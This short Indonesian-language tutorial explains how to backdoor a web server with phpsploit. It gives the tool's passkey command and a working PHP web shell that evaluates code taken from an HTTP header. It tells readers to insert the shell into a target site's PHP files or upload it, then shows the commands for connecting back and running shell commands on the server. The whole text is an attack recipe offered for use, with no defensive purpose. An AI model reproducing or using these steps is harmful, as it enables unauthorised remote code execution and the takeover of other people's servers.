• mula-mula persiapkan web yang akan mau di reverse shell
• lalu masuk dan Creat payload dengan cara dibawah ini
- ./phpsploit
- $phpsploit > set PASSKEY NEROGATIV13
• maka akan menghasilkan kode:
- <?php @eval($_SERVER['HTTP_NEROGATIV13']); ?>
• Kalian bisa menyisipkan kode remote tersebut ke dalam skrip 
file PHP di server web, atau bisa juga dengan menyimpannya misal Nerogativ13.php Dan kalian upload ke server target web kalian.
• Dan untuk melakukan reverse shell nya kalian bisa masuk lagi ke aplikasi Termux kalian. 
lalu jalankan Phpsploit. 
- $phpsploit > set TARGET http://vulnwebtarget.com/Nerogativ13.php 
• Lalu kalian tekan Enter dan masukan perintah:
- $phpsploit > exploit 
- Tekan Enter 
• Dan boom kalian berhasil melakukan backconnect dengan Phpsploit 
kalian tidak perlu repot lagi untuk melakukan bind port, 
jalankan ngrok atau semacamnya. Dan untuk mengeceknya kalian bisa 
jalankan:
- $phpsploit > run ls